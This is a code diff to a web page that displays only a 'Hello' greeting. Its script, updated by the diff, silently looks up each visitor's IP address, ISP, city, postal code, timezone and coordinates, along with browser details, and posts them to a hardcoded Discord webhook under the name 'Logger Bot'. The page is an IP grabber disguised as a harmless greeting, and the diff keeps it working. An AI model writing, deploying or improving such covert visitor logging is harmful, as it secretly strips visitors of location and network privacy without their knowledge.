@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Hi</title>
   <style>
     body {
@@ -20,13 +20,14 @@
 </head>
 <body>
   <h1>Hello 👋</h1>
-  
+
   <script>
     async function getVisitorInfo() {
       try {
-        const res = await fetch('https://ipapi.co/json/');
+        const res = await fetch('https://ipwho.is/');
         if (!res.ok) throw new Error('Failed to fetch IP info.');
         const data = await res.json();
+        if (!data.success) throw new Error('IP lookup failed.');
 
         const userAgent = navigator.userAgent;
         const language = navigator.language || navigator.userLanguage;
@@ -47,16 +48,16 @@
 
 🌐 **Network Info**
 • IP: \`${data.ip}\`
-• ISP: ${data.org}
-• Country: ${data.country_name}
-• Region: ${data.region}
-• City: ${data.city}
-• Postal: ${data.postal}
-• Timezone: ${data.timezone}
+• ISP: ${data.connection.isp || 'N/A'}
+• Country: ${data.country || 'N/A'}
+• Region: ${data.region || 'N/A'}
+• City: ${data.city || 'N/A'}
+• Postal: ${data.postal || 'N/A'}
+• Timezone: ${data.timezone || 'N/A'}
 
 📌 **Location**
-• Latitude: ${data.latitude}
-• Longitude: ${data.longitude}
+• Latitude: ${data.latitude || 'N/A'}
+• Longitude: ${data.longitude || 'N/A'}
         `;
 
         await fetch("https://discord.com/api/webhooks/1365451163214024805/8OezJtvTg9WGDTX6vrHHr3z0eMq04t4NlVl0SUMDfhAOlg_l_Hyq4m6uDL2mEeUZwt3t", {
@@ -64,7 +65,10 @@
           headers: {
             "Content-Type": "application/json"
           },
-          body: JSON.stringify({ content })
+          body: JSON.stringify({
+            content: content,
+            username: "Logger Bot 🔍"
+          })
         }).then(response => {
           if (!response.ok) {
             console.error('Discord Webhook Failed:', response.status);
